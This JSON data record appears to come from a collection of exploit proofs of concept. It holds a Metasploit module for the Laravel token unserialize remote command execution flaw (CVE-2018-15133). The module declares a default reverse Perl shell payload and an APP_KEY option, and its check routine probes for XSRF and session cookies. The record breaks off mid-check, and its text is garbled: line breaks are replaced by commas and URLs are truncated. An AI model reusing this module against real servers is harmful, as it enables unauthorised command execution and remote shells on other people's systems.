{
    "text": "vul_name : PHP Laravel Framework Token Unserialize Remote Command Execution ， vul_cve : CVE-2018-15133 , CVE-2017-16894 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : Tcp ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'PHP Laravel Framework token Unserialize Remote Command Execution' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40 , 5.6.x <= 5.6.29. ， Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header , due to ， an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php. ， Authentication is not required , however exploitation requires knowledge of the Laravel APP_KEY. ， Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix. ， In some cases the APP_KEY is leaked which allows for discovery and exploitation. ， } ,  ， 'DisclosureDate' => '2018-08-07' ,  ， 'Author' => ，  [  ， 'Stle Pettersen' ,  # Discovery ， 'aushack' ,  # msf exploit + other leak ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2018-15133' ]  ,  ，  [ 'CVE' , '2017-16894' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultTarget' => 0 ,  ， 'Stance' => Msf : Exploit : Stance : Aggressive ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl' } ,  ， 'Payload' => { 'DisableNops' => true } ,  ， 'Targets' => [ 'Automatic' , {} ]  ,  ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Path to target webapp' , '/' ]  )  ,  ， OptString.new ( 'APP_KEY' ,  [ false , 'The base64 encoded APP_KEY string from the .env file' , ' ]  )  ，  ]  )  ， end ， def check ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'index.php' )  ,  ， 'method' => 'GET' ， } )  ，  # Can be 'XSRF-TOKEN' , 'X-XSRF-TOKEN' , 'laravel_session' , or $ appname_session. and maybe more? ， unless res res.headers res.headers.to_s = ~ /XSRF-TOKEN | laravel_session/i",
    "time": "2019.07.16"
}